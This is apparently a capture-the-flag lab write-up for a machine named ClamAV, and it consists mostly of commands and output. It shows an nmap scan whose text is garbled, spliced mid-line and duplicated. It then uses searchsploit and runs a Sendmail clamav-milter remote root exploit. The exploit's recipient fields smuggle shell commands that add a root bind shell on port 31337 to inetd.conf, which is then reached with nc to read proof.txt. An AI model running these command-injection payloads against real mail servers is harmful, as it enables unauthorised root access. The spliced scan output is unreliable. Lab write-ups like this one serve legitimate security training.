```shell
nmap -sC -sV -Pn -p- 192.168.122.42
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 22:20 CST
Nmap scan report for 192.168.122.42
Host is up (0.045s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 303ea4135f9a32c08e46eb26b35eee6d (DSA)
|_  1024 afa2493ed8f226124aa0b5ee6276b018 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.49.122], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smnmap -sC -sV -Pn -p- 192.168.122.42
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 22:20 CST
Nmap scan report for 192.168.122.42
Host is up (0.045s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 303ea4135f9a32c08e46eb26b35eee6d (DSA)
|_  1024 afa2493ed8f226124aa0b5ee6276b018 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.49.122], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 303ea4135f9a32c08e46eb26b35eee6d (DSA)
|_  1024 afa2493ed8f226124aa0b5ee6276b018 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h30m30s, deviation: 3h32m08s, median: 5h00m29s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-30T04:21:40-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.09 seconds
bd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 303ea4135f9a32c08e46eb26b35eee6d (DSA)
|_  1024 afa2493ed8f226124aa0b5ee6276b018 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h30m30s, deviation: 3h32m08s, median: 5h00m29s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-30T04:21:40-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.09 seconds

```

Saw that Sendmail was running. Came across a ton of details on ClamAV
```shell
┌──(kali㉿kali)-[~/OPG/ClamAV]
└─$ searchsploit clamav            
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Overflow       | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference                    | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                                  | linux/remote/4862.py
ClamAV < 0.102.0 - 'bytecode_vm' Code Execution                                   | linux/local/47687.py
ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)                     | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service                          | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)                 | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)      | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                   | multiple/remote/4761.pl
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
---------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                      |  Path
---------------------------------------------------------------------------------- ---------------------------------
[Azerbaijan] ClamAV Bypassing                                                     | docs/azerbaijan/31685-[azerbaija
---------------------------------------------------------------------------------- ---------------------------------
                                                                                                                    
┌──(kali㉿kali)-[~/OPG/ClamAV]
└─$ searchsploit -m multiple/remote/4761.pl
  Exploit: Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/4761
     Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl
File Type: ASCII text

Copied to: /home/kali/OPG/ClamAV/4761.pl


                                                                                                                    
┌──(kali㉿kali)-[~/OPG/ClamAV]
└─$ ls
4761.pl  clamav.gnmap  clamav.nmap  clamav.xml
                                                                                                                    
┌──(kali㉿kali)-[~/OPG/ClamAV]
└─$ nano 4761.pl              
```
Edited the exploit I found in searchsploit
```
┌──(kali㉿kali)-[~/OPG/ClamAV]
└─$ perl 4761.pl 192.168.122.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.122.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 31 Jan 2023 04:32:33 -0500; (No UCE/UBE) logging access from: [192.168.49.122](FAIL)-[192.168.49.122]
250-localhost.localdomain Hello [192.168.49.122], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 30V9WX9H004014 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```
Ran the command above which sets up a speciall 31337 port that is not being used.
```                                    
┌──(kali㉿kali)-[~/OPG/ClamAV]
└─$ nc 192.168.122.42 31337
whoami
root
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd /root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
bb9a5d32e216238bf66fbae06fa7eeea

```
We are immediately root.